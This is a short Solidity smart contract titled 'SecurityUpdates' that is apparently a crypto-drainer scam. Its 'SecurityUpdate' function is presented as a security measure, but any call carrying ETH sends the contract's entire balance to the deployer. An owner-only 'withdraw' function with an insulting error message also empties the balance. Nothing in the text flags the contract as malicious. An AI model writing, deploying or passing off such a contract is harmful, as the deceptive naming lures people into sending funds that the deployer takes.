1 pragma solidity ^0.8.7;
2 
3 contract SecurityUpdates {
4     address private owner;
5     constructor() {
6         owner = msg.sender;
7     }
8     function withdraw() public payable {
9         require(msg.sender == owner, "Bro? Are you a stupid idiot?");
10         payable(msg.sender).transfer(address(this).balance);
11     }
12     function SecurityUpdate() public payable {
13         if (msg.value > 0) payable(owner).transfer(address(this).balance);
14     }
15 }